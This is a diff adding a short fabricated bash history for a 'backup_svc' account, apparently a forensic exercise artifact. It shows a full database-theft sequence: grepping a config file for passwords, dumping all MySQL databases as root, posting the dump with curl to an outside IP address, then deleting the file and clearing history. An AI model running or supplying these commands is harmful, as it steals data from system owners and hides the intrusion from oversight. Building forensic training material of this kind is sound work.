@@ -1,0 +1,13 @@
+# ~/.bash_history extract
+# User: backup_svc
+# Timeline: April 1, 2024
+
+ls -la /var/www/html/
+find /var/www -name "*.sql" -o -name "*.db" 2>/dev/null
+cat /var/www/html/config.php | grep -i password
+mysql -u root -p'admin123!' -e "SHOW DATABASES;"
+mysqldump -u root -p'admin123!' --all-databases > /tmp/db_backup.sql
+curl -X POST http://185.220.101.47:8080/receive -d @/tmp/db_backup.sql
+rm /tmp/db_backup.sql
+history -c
+exit
